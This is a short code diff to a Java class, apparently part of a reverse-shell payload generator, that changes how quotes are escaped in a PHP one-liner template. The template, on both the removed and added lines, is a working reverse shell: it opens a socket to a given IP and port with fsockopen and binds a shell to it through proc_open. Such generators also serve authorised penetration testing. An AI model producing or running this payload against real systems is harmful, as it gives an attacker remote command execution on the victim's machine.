@@ -8,7 +8,7 @@ public class Php_procopen extends Reverse {
 
     public Php_procopen(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("php -r '$sock=fsockopen(\\\"%s\\\",%s);$proc=proc_open(\\\"%s\\\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'", this.getLocalIP(), this.getLocalPort(), this.getShell());
+        shellFormat = String.format("php -r '$sock=fsockopen(\"%s\",%s);$proc=proc_open(\"%s\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'", this.getLocalIP(), this.getLocalPort(), this.getShell());
     }
 
     @Override
